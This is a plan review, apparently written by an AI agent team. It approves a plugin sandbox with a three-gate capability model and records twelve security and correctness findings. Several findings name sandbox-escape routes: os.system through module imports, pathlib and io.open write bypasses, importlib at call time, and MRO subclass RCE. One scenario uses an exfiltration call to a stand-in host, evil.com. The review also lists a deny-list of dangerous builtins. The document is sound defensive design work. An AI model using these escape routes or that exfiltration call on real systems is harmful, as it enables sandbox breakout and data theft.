# Plan Review: plugin-architecture

## Verdict: APPROVED
## Reviewer Stance: Team — Interlocutor + Proposer
## Date: 2026-04-23
## Mode: Agent Team (concurrent review + revision)

## Exchange Summary

12 yield points raised. Three rounds of exchange (the second round on Y3/Y6 was productive rather than oscillating — both parties used it to sharpen security-critical architectural decisions). All 12 resolved, with the structural findings producing materially stronger architecture than the original draft. The revised PRP is shippable; the Uncertainty Log went from 8 open punts to 2 scoped questions.

**Critical architectural shifts from the dialectic:**
- Y3 resolution banned `os`/`pathlib`/`io`/`shutil` at every trust tier, replaced with four purpose-built proxy modules.
- Y6 upgraded to a three-gate capability model (static AST / meta_path / runtime) with each gate using exactly one source of truth — no cross-contamination.
- Y4 exposed a grammar-generation bug at `grammar.py:326` that would have caused generated Lark grammars to fail to parse.

## Yield Points Found

### 1. `compile_restricted` citation does not exist
**Severity:** Structural
**Evidence:** Task 5 names `compile_restricted at line 517`. Line 517 is a docstring. Real call graph: `_TgirlNodeTransformer` (`compile.py:439`) → `_analyze_python_ast` (512) → `_build_sandbox` (603) → `run_pipeline` (703) → sandboxed bytecode execution site (800). Task 5 plumbing had no referent.
**Proposer Response:** Accepted. PRP §2 ("Existing sandbox") retitled "Sandbox A" with correct call graph enumerated. Task 5 approach rewritten as 4-step plumbing: `CompileConfig.grant` → `run_pipeline` → `_analyze_python_ast` → `_TgirlNodeTransformer` + `_build_sandbox`. Task 5 tests replaced with three shape tests keyed to real entry points.
**PRP Updated:** Yes.

### 2. Sandbox A vs Sandbox B conflated; `open` false premise
**Severity:** Structural
**Evidence:** Task 6 Uncertainty Log claimed `open` is "a safe builtin in the default sandbox." False — `_build_sandbox` at `compile.py:626-641` has exactly 14 safe builtins; `open`, `compile`, `__import__`, `exec`, `eval`, `getattr` are NOT included. PRP conflated Sandbox A (Hy bytecode, exists) with Sandbox B (plugin import, proposed by Task 4, does NOT exist yet). The Task 6 uncertainty was solving a non-problem.
**Proposer Response:** Accepted. §2 split into two named sandboxes with explicit builtins contracts. Task 4 gained a "Sandbox B safe-builtins contract" section with capability-conditional `open` handling. `open` Uncertainty entry rewritten as resolved decision. Noted flag for security audit: Sandbox B uses default-deny blacklist vs RestrictedPython canonical whitelist — Task 7 gains `test_no_rce_via_type_mro_subclasses` and `test_no_rce_via_empty_tuple_class_base_subclasses`; whitelist-vs-blacklist is audit scope, not PRP re-open.
**PRP Updated:** Yes.

### 3. `os` module capability-escalation vector
**Severity:** Structural (most load-bearing security finding)
**Evidence:** Original Task 6 mapped `os` to both `FILESYSTEM_WRITE` and `ENV`. A plugin granted only `FILESYSTEM_WRITE` would gain access to `os.system`, `os.execv`, `os.environ`, `os.kill` — collapsing SUBPROCESS, ENV, and FILESYSTEM_READ into any capability that permits `os` module import. PRP line 257 ("Each capability is INDEPENDENT") was materially false. `compile.py:495-509` `visit_Attribute` only rejects dunders, so `os.system(...)` passes the AST check.

**Round-2 sub-finding (3a/3b):** `io.open is open` → True. `pathlib.Path.write_text()` bypasses the `open()` builtin wrapper via `io.open`. Verified empirically. Original resolution had left two authorized-path escape vectors.

**Proposer Response:** Accepted as the load-bearing security issue. Chose option (α): ban `os`/`pathlib`/`io`/`shutil` at every tier; plugin authors use four purpose-built proxy modules (`env_proxy`, `subprocess_proxy`, `fs_read_proxy`, `fs_write_proxy`) with explicit exclusions (`symlink_to`, `hardlink_to`, `chmod`, `chown`). Added three regression-sentry tests: `test_filesystem_read_grant_cannot_pathlib_write_text`, `test_filesystem_read_grant_cannot_io_open_write_mode`, `test_filesystem_read_grant_cannot_pathlib_unlink`. These forcibly grant the banned module (bypassing `CAPABILITY_MODULES`) and verify the `CapabilityScopedModule` wrapper still denies the operation — future-proofs against mapping drift.
**PRP Updated:** Yes.

### 4. Lark rule names cannot contain dots
**Severity:** Structural
**Evidence:** `grammar.py:326` emits `f"call_{tool.name}".lower()` as rule LHS. If `tool.name = "math.add"` (post-namespacing in Task 10), the rule name becomes `call_math.add` — invalid Lark syntax. `tools.cfg.j2` emits `prod.name` unsanitized on the LHS. Task 10 `test_grammar_accepts_dotted_tool_names` would have failed at Lark parsing before any `llguidance` involvement.
**Proposer Response:** Accepted. Task 10 approach added `_sanitize_rule_name()` step (dot → underscore replacement) at both generation sites. Original dotted name preserved as quoted terminal in rule body. Fail-fast on sanitized-name collisions (`math.add` + `math_add` both would sanitize to `call_math_add`). `Registry.sanitized_rule_names()` helper as canonical source of truth. Four new grammar tests.
**PRP Updated:** Yes.

### 5. `--tools required=True` blocks plugin-only workflow
**Severity:** Structural
**Evidence:** `cli.py:119-124` has `required=True` on the `--tools` option. Task 3 added `--plugin` but didn't relax `--tools`. Task 14's smoke test `tgirl serve --model <m> --plugin math` (no `--tools`) would have failed click validation.
**Proposer Response:** Accepted. Task 3 makes `--tools` optional (`required=False, default=()`). Added validation: at least one of `--tools`, `--plugin`, `--plugin-config`, or auto-discovered `tgirl.toml` must be present. Three new tests including regression for the tools-only path.
**PRP Updated:** Yes.

### 6. Load-time vs call-time gate inconsistency
**Severity:** Structural
**Evidence:** PRD AC#3 specified import-time gating via `manifest.allow`; AC#4 specified call-time gating via effective grant; PRP Task 9 forced zero grant when `--allow-capabilities` absent, which would prevent import entirely. Task 9 test `test_function_call_capability_denied_when_grant_insufficient` required import to succeed first — forcing a choice the PRP had not made.

**Round-2 sub-finding:** The proposer's initial "option (A) two-gate" resolution still consulted `manifest.allow` in the meta_path finder — mixing declaration checking with runtime enforcement in a single gate.

**Proposer Response:** Upgraded to option (iii) — three-gate model with full separation of concerns:
- **Gate 1 (static AST scan)** uses `manifest.allow` exclusively. Walks the full module AST (top-level + function + class bodies). Catches under-declaration. Does NOT authorize anything.
- **Gate 2 (`sys.meta_path` finder)** materializes capability-mapped modules as `CapabilityScopedModule` wrappers. Consults neither `manifest.allow` nor `effective_grant`.
- **Gate 3 (`CapabilityScopedModule.__getattribute__`)** uses `effective_grant` exclusively via `_guard` contextvar. Data attrs pass through; callable invocations raise when capability absent.

4-scenario behavioral walkthrough added. "Why option (iii) not (ii)" rationale block explains separation of concerns.

**Critical scenario re-verified:** `manifest.allow=["network"]` + `--no-allow-capabilities` + plugin top-level `socket.create_connection(("evil.com", 443))` — Gate 1 passes (network declared), Gate 2 wraps `socket`, Gate 3 returns `_CapabilityDeniedCallable` which raises on invocation. Import-time exfil hole is closed at load time, not deferred to tool-call time. PRD line 198 is now honored.

**Followup:** PRD AC#3/AC#4/§5 language is ambiguous under the three-gate model. Flagged in Uncertainty Log as a recommended PRD amendment; PRP is authoritative for implementation.
**PRP Updated:** Yes. PRD amendment recommended (non-blocking).

### 7. Stdlib autodiscovery upgrade risk
**Severity:** Moderate
**Evidence:** PRP called out "hard-coded list" without specifying location or versioning. v1.1 additions would silently change the registered tool surface on pip-upgrade with no user opt-in.
**Proposer Response:** Accepted. Task 11 gained version pinning via `[plugins.stdlib] version = N` in TOML. `src/tgirl/plugins/stdlib/_versions.py` as hard-coded per-version tool manifest (not filesystem-globbed). Unpinned configs follow HEAD with WARN log on delta; pinned + removed entry fails fast. Three new tests.
**PRP Updated:** Yes.

### 8. `/telemetry` leaks `capabilities_granted` without auth
**Severity:** Moderate
**Evidence:** Task 11 AC#6 exposes `capabilities_granted` in `/telemetry` with no auth. Server defaults to `--host 0.0.0.0` per `cli.py:108`. Combined with Ollama gap-analysis Jan 2026 mass-exploitation incident, this would advertise plugin grants to any LAN peer.
**Proposer Response:** Accepted. Task 11 approach: `/telemetry` always exposes `{name, source}`. `capabilities_granted` STRUCTURALLY ABSENT for non-loopback callers (not redacted — structurally absent to avoid response-shape timing leaks). Startup WARN `plugin_grants_visible_to_remote_hosts` when `--host != 127.0.0.1` AND `--allow-capabilities`. Broader auth question flagged for separate `server-auth` PRD.
**PRP Updated:** Yes.

### 9. Test count target undercalibrated
**Severity:** Moderate
**Evidence:** Task 14 target "1160-1180" implied +37..+57 tests but declared tests in Tasks 1-13 sum to ~75. Target range half the declared count.
**Proposer Response:** Accepted. Ran `pytest --collect-only -q` → 1123 baseline confirmed. Enumerated declared tests per task: ~105 new. Target raised to 1220-1250. A 20-test shortfall is now observable.
**PRP Updated:** Yes.

### 10. Task 5/6 split is artificial
**Severity:** Moderate
**Evidence:** Task 5 stubbed an empty mapping; Task 6 filled it. Task 5 tests observed no behavioral delta from pre-Task-5 (empty ∩ anything = empty). Violates CLAUDE.md "No fix later shims" rule.
**Proposer Response:** Accepted as valid. Chose preservation of split over merge (rollback granularity + security-audit boundary argued more valuable than collapse). Task 5 now ships real partial mapping: `CLOCK → {time, datetime, calendar}` and `RANDOM → {random, secrets, uuid}` (the default-granted caps). Task 6 extends with the remaining 5 capabilities + proxies + `open`-wrapper. Explicit contract block at Task 5 spells out the deliverable boundary. Three real behavior-delta tests added to Task 5.
**PRP Updated:** Yes.

### 11. Dynamic importlib at call-time unresolved
**Severity:** Moderate
**Evidence:** Original Uncertainty Log dismissal ("importlib not in safe builtins") was evidence-free. Task 4 `sys.meta_path` guard was contextvar-scoped to import only — no guard at tool-call time. Plugin functions retain ORIGINAL `__builtins__` reference including `__import__`. Two-key model would collapse to one-key without this defense.
**Proposer Response:** Accepted. Task 4 §2 added dual-phase meta_path: Phase A during plugin import, Phase B during tool-call dispatch via `ToolRegistry.get_callable(name)` wrapper. Task 4 §2b added register-time AST re-check on function bodies rejecting `importlib`, `__import__`, `exec`, `eval`, `compile`, `globals`, `locals`, `vars`, `getattr`, `setattr`, `delattr`, `__builtins__`, `__loader__`, `__spec__`. Task 7 adversarial tests added including stashed-builtins-reference and getattr-indirection-to-import.
**PRP Updated:** Yes.

### 12. Cross-platform path heuristic
**Severity:** Minor
**Evidence:** "Contains `/` or ends in `.py`" misroutes Windows paths like `C:\plugins\my_plugin`.
**Proposer Response:** Accepted. Data model gains `kind: Literal["module", "file", "auto"] = "auto"` on `PluginManifest`. Task 4 module discovery uses robust detection: `p.suffix == ".py"`, `os.sep in module`, `p.is_absolute()`, `p.is_altsep`, or explicit `source_path`. POSIX-with-backslash ambiguity documented as requiring explicit `kind="file"`. Task 12 adds platform-parametrized smoke tests.
**PRP Updated:** Yes.

## What Holds Well

- **Existing-tool-registration citations are mostly correct.** Verified `registry.py:88, 101, 174, 255`, `cli.py:20, 51, 120`, `serve.py:625-628`. Only the `compile.py` `compile_restricted` phantom needed fixing.
- **Two-key opt-in is the right mental model** for a capability system. Design intent is sound; implementation specifics just needed tightening (Y6).
- **Hypothesis property testing in Task 7** is the right instinct for combinatorial capability testing.
- **Stdlib invariant** ("every stdlib function must be zero-capability") is a crisp, enforceable rule.
- **Rollback plan distinguishes Task 5-7 cluster** from additive tasks — correct recognition of where sandbox changes coupling lives.
- **`/security-audit-team` flagged between Task 7 and Task 11** is the right pressure point.
- **Namespace-by-plugin collision scheme** (PRD §6.3c) is the right call; Y4 only exposed a grammar-generation gap in implementation.
- **Three-gate model with single source of truth per concern** (post-revision Y6) produced a cleanly auditable architecture — separation of concerns at a load-bearing security boundary.

## Remaining concerns (non-blocking)

- **Sandbox B blacklist vs whitelist** — Y2 audit-queue flag. The revised PRP uses default-deny blacklist for Sandbox B builtins. Multiple defenses layer on top. If `/security-audit-team` concludes a whitelist is required, that becomes a Task-4 revision inside the audit, not a PRP re-open. Regression-sentry tests (`test_no_rce_via_type_mro_subclasses`, `test_no_rce_via_empty_tuple_class_base_subclasses`) already in Task 7.
- **PRD AC#3/AC#4/§5 language** is ambiguous under the three-gate Y6 model. Recommended amendment; PRP is authoritative for implementation.
- **Implementation note for executor:** `CapabilityScopedModule.__getattribute__` must correctly handle `_handle_fromlist` (the `from X import Y` path). CPython 3.11+ routes these through `__getattribute__` so the design works, but explicit `from socket import create_connection; create_connection(...)` test should appear in Task 4.

## Summary

The dialectic surfaced five structural issues that would have executor-blocked, security-unsound, or silently broken the plan (Y1 phantom citation, Y2 sandbox conflation, Y3 `os`-module capability collapse, Y4 Lark grammar generation bug, Y5 CLI regression). Y3 and Y6 received second-round pressure that produced material architectural improvements — the Y3 four-proxy-module resolution and the Y6 three-gate separation-of-concerns model are both stronger than either the draft or the first-round revision would have produced alone. The Uncertainty Log went from 8 unresolved punts to 2 scoped questions with rationale.

**Verdict: APPROVED.** Recommend `/execute-team docs/PRPs/plugin-architecture.md`. Do NOT skip the `/security-audit-team` gate between Task 7 and Task 11 — that is where the Sandbox-B blacklist-vs-whitelist question gets proper adversarial pressure.
